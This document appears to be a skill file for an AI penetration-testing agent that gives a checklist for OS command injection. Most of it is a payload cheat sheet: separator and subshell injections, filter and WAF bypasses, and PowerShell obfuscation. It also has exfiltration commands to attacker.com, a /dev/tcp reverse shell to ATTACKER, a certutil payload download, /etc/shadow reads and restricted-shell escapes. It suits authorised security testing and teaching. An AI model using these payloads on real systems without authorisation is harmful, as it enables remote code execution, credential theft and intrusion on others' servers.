---
name: command-injection
description: OS command injection detection, exploitation, and filter bypass
origin: RedteamOpencode
---

# OS Command Injection Testing

## When to Activate

- User input flows into system commands (ping, nslookup, file operations, PDF generation)
- Application calls OS utilities with user-supplied arguments
- Parameters that reference filenames, hostnames, IPs, or paths

## Tools

- `run_tool curl` / `run_tool wget` (manual requests)
- Burp Suite Repeater + Intruder
- Commix (automated command injection)
- Custom wordlists for injection payloads

## Methodology

### 1. Identify Injection Points

- [ ] Map all parameters that could reach OS commands
- [ ] Look for functionality: DNS lookup, ping, traceroute, file conversion, mail
- [ ] Check headers (Host, X-Forwarded-For) if processed server-side

### 2. Basic Detection Payloads

- [ ] Inline separators: `; id`, `| whoami`, `|| whoami`, `& whoami`, `&& id`
- [ ] Backtick execution: `` `id` ``
- [ ] Subshell: `$(whoami)`
- [ ] Newline injection: `%0aid`, `%0a%0dwhoami`
- [ ] Pipeline: `input | cat /etc/passwd`

### 3. Blind Command Injection

- [ ] Time-based: `; sleep 5` — measure response delay
- [ ] Time-based (Windows): `& timeout /t 5`
- [ ] DNS exfiltration: `; nslookup $(whoami).attacker.com`
- [ ] HTTP callback: `; curl http://attacker.com/$(id | base64)`
- [ ] File write then read: `; id > /var/www/html/output.txt`

### 4. Filter Bypass Techniques

- [ ] Space bypass: `$IFS` → `cat$IFS/etc/passwd`
- [ ] Space bypass: `${IFS}` → `cat${IFS}/etc/passwd`
- [ ] Space bypass: `%09` (tab), `{cat,/etc/passwd}`
- [ ] Wildcard bypass: `/???/??t /???/p??s??` (for `cat /etc/passwd`)
- [ ] Quote bypass: `w"h"o"a"mi`, `w'h'o'a'mi`
- [ ] Backslash: `w\ho\am\i`
- [ ] Variable concat: `a=who;b=ami;$a$b`
- [ ] URL encoding: `%26`, double-encoding `%2526`
- [ ] Hex/octal encoding in `printf` or `$'\x77\x68\x6f\x61\x6d\x69'`

### 5. Windows-Specific

- [ ] Separators: `&`, `&&`, `|`, `||`
- [ ] Command: `& dir`, `| type C:\windows\win.ini`
- [ ] Bypass: `^` caret insertion → `w^h^o^a^m^i`
- [ ] Env variable slicing: `%COMSPEC:~-16,1%%COMSPEC:~-1%` = `ec` (for echo)
- [ ] PowerShell instead of cmd.exe: `; powershell -enc <base64-UTF16LE>` when `powershell.exe` is reachable — bypasses cmd-specific filters entirely
- [ ] PowerShell obfuscation: `I`+`E`+`X` string concat (`&('I'+'EX')`), backtick char-splitting (`I`E`X`), `-join`/`-replace` reconstruction of blocked cmdlet names
- [ ] Alternate data stream / `certutil` LOLBins for staged payload retrieval: `certutil -urlcache -f http://ATTACKER/p.exe p.exe`
- [ ] `wmic process call create "..."` and `mshta` as alternate command-execution primitives when direct shell metacharacters are filtered

### 5b. Argument Injection (no shell metacharacter needed)
When input reaches `execve`/`ProcessBuilder`/`subprocess.run([...])` array form directly (no shell interpolation), classic separator injection fails but flag/argument injection may still work if the app builds an argv list from user input.

- [ ] Inject option-looking values: a "filename" parameter passed as `--output=/etc/cron.d/pwn` to a tool that accepts `--output`
- [ ] `tar`/`zip` argument injection via crafted filenames inside an archive that is later extracted with a wildcard (`tar -xf *`), e.g. a member named `--checkpoint=1` / `--checkpoint-action=exec=sh shell.sh`
- [ ] `git` argument injection via crafted branch/tag/URL values: `--upload-pack=`, `ext::sh -c ...` as a clone URL
- [ ] `find`/`rsync`/`ffmpeg`/`curl` argument injection via filenames or URLs beginning with `-` (e.g., `-oProxyCommand=`); confirm the target actually parses leading-dash input as a flag rather than literal data

### 6. Exploitation

- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
- [ ] Establish reverse shell: `; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
- [ ] Enumerate internal network: `; ifconfig`, `; cat /etc/hosts`
- [ ] Pivot: `; curl http://internal-service/`

### 7. Context-Specific Checks

- [ ] Inside quotes: escape with `"`, then inject
- [ ] Inside `$(...)`: nest commands
- [ ] Restricted shell: check available commands, PATH manipulation
- [ ] Restricted shell escape via built-ins/LOLBins reachable from a limited PATH: `awk 'BEGIN{system("/bin/sh")}'`, `perl -e 'exec "/bin/sh";'`, `python3 -c 'import os;os.system("/bin/sh")'`, `vi` (`:!sh`), `less`/`man` (`!sh`)
- [ ] `PATH` hijack when injected input runs an unqualified binary name (`cat`, `sh`, `convert`) and a writable/prependable directory exists — plant a malicious binary and manipulate `PATH` or the working directory to shadow the real one
- [ ] Chained-context injection: parameter reaches a template/config generator (e.g., a YAML/INI file later consumed by a cron job or CI runner) rather than an immediate shell call — confirm indirect execution timing (poll for effect after a scheduled interval) before ruling the sink safe
- [ ] Null-byte / encoding edge cases some parsers still mishandle: `%00`, mixed encodings (`%25%30%30`), and Unicode normalization tricks that decode to shell metacharacters after a validation step but before execution

## What to Record

- Exact parameter and endpoint vulnerable
- Payload used (including encoding)
- Command output or timing difference observed
- OS and shell type confirmed
- Whether blind or reflected
- Filter/WAF bypass technique required
- Severity: Critical (RCE achieved) or High (blind confirmed)
- Remediation: use allowlists, parameterized APIs, avoid shell calls
